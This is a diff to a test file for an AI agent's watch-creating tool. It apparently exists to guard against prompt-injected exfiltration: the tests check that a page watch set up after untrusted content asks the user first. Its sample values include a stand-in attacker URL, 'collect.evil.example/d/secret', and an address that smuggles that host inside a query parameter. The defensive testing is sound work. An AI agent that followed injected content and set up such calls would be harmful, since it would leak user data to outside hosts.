@@ -61,7 +61,7 @@ const EVIL = 'https://collect.evil.example/d/secret';
 describe('a watch task_create sets up after foreign content', () => {
   it('a watch_url with data in the path is asked about, and no watch is created without a yes', async () => {
     const tool = taskCreate();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     const result = await call(agent, { title: 'Watch', watch_url: EVIL });
     expect(ask.asked).toHaveLength(1);
@@ -71,7 +71,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('the question says how often the page is read once confirmed, and that the yes does not confirm it', async () => {
     const tool = taskCreate();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     await call(agent, { title: 'Watch', watch_url: EVIL });
     expect(ask.asked[0]).toMatch(/^Watch the page on "collect\.evil\.example"\? Once you confirm the watch under Automation → Triggers, lynox checks the page every 60 minutes on its own, until you pause or delete it there\. /);
@@ -81,7 +81,7 @@ describe('a watch task_create sets up after foreign content', () => {
   });
 
   it('the interval the question names is clamped as the handler clamps it: at least 5 minutes, 60 when not given', async () => {
-    const ask = asker('Deny');
+    const ask = asker('deny');
     await call(agentOf(taskCreate(), ask.fn), { title: 'Watch', watch_url: EVIL, watch_interval_minutes: 2 });
     await call(agentOf(taskCreate(), ask.fn), { title: 'Watch', watch_url: EVIL, watch_interval_minutes: 0 });
     await call(agentOf(taskCreate(), ask.fn), { title: 'Watch', watch_url: EVIL, watch_interval_minutes: 15 });
@@ -92,7 +92,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('in German it asks to watch the page, and says the yes does not confirm it', async () => {
     const tool = taskCreate();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn, 'nothing named', true, { noticeLanguage: 'de' } as Extra);
     await call(agent, { title: 'Watch', watch_url: EVIL });
     expect(ask.asked[0]).toMatch(/^Seite auf „collect\.evil\.example“ beobachten\? Wenn du die Beobachtung danach unter Automation → Trigger bestätigst, prüft lynox die Seite alle 60 Minuten selbst, bis du sie dort pausierst oder löschst\. /);
@@ -102,7 +102,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('a watch with run_at is still a watch, and is asked about', async () => {
     const tool = taskCreate();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     await call(agent, { title: 'Watch', watch_url: EVIL, run_at: '2026-12-01T09:00:00' } as Input);
     expect(ask.asked).toHaveLength(1);
@@ -112,7 +112,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('a watch_url that does not parse is refused without a question', async () => {
     const tool = taskCreate();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = agentOf(tool, ask.fn);
     const result = await call(agent, { title: 'Watch', watch_url: 'not a url' });
     expect(ask.asked).toEqual([]);
@@ -122,7 +122,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('a yes creates the watch', async () => {
     const tool = taskCreate();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = agentOf(tool, ask.fn);
     await call(agent, { title: 'Watch', watch_url: EVIL });
     expect(ask.asked).toHaveLength(1);
@@ -131,7 +131,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('CONTROL: a watch on a host the owner named is created without a question', async () => {
     const tool = taskCreate();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn, 'watch the prices on shop.example.ch');
     await call(agent, { title: 'Watch', watch_url: 'https://shop.example.ch/prices' });
     expect(ask.asked).toEqual([]);
@@ -140,7 +140,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('CONTROL: without foreign content before it, the same watch is not asked about', async () => {
     const tool = taskCreate();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn, 'nothing named', false);
     await call(agent, { title: 'Watch', watch_url: EVIL });
     expect(ask.asked).toEqual([]);
@@ -154,7 +154,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('a watch the network policy refuses is refused without a question, with the refusal the handler gives', async () => {
     const tool = taskCreate();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const outside = await call(withPolicy(agentOf(tool, ask.fn), 'allow-list'), { title: 'Watch', watch_url: EVIL });
     expect(ask.asked).toEqual([]);
     expect(outside.is_error).toBe(true);
@@ -167,7 +167,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('CONTROL: a watch on a host the allow-list holds is still asked about after foreign content', async () => {
     const tool = taskCreate();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     await call(withPolicy(agentOf(tool, ask.fn), 'allow-list'), { title: 'Watch', watch_url: 'https://listed.example/d/secret' });
     expect(ask.asked).toHaveLength(1);
     expect(ask.asked[0]).toMatch(/^Watch the page on "listed\.example"\? /);
@@ -176,7 +176,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('a check before the question that throws refuses the call with a fixed text, asks nothing and runs nothing', async () => {
     const tool = { ...taskCreate(), refusesUnasked: () => { throw new Error('policy store at /secret/path is gone'); } } as unknown as ToolEntry & { created: string[] };
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const result = await call(agentOf(tool, ask.fn), { title: 'Watch', watch_url: 'https://listed.example/p' });
     expect(result.is_error).toBe(true);
     expect(String(result.content)).toContain(REFUSES_UNASKED_UNREADABLE);
@@ -187,7 +187,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('a secret reference does not make the hook refuse the call', async () => {
     const tool = taskCreate();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = withPolicy(agentOf(tool, ask.fn, 'nothing named', false), 'deny-all');
     await call(agent, { title: 'Watch', watch_url: 'secret:FEED_URL' });
     expect(tool.created).toEqual(['secret:FEED_URL']);
@@ -195,7 +195,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('CONTROL: a call the handler does not turn into a watch is not asked about (a schedule or a workflow comes first)', async () => {
     const tool = taskCreate();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     await call(agent, { title: 'Daily', schedule: '0 8 * * *', watch_url: EVIL });
     await call(agent, { title: 'Flow', workflow_id: 'wf-1', watch_url: EVIL });
@@ -206,7 +206,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('a session of someone the owner let in is refused, not asked', async () => {
     const tool = taskCreate();
-    const ask = asker('Allow');
+    const ask = asker('allow');
     const agent = agentOf(tool, ask.fn, 'nothing named', true, { principal: { kind: 'mandate', email: 'helper@example.ch' } } as Extra);
     const result = await call(agent, { title: 'Watch', watch_url: EVIL });
     expect(ask.asked).toEqual([]);
@@ -226,7 +226,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('a page a search listed is watched without a question', async () => {
     const tool = taskCreate();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn);
     agent.searchResultAddresses.noteResults('price list', ['https://news.listed.example/prices']);
     await call(agent, { title: 'Watch', watch_url: 'https://news.listed.example/prices' });
@@ -236,7 +236,7 @@ describe('a watch task_create sets up after foreign content', () => {
 
   it('an address that carries another address is asked about as a watch, even on a host the owner named', async () => {
     const tool = taskCreate();
-    const ask = asker('Deny');
+    const ask = asker('deny');
     const agent = agentOf(tool, ask.fn, 'watch shop.example.ch');
     await call(agent, { title: 'Watch', watch_url: 'https://shop.example.ch/fetch?u=https%3A%2F%2Fcollect.evil.example%2Fd' });
     expect(ask.asked).toHaveLength(1);
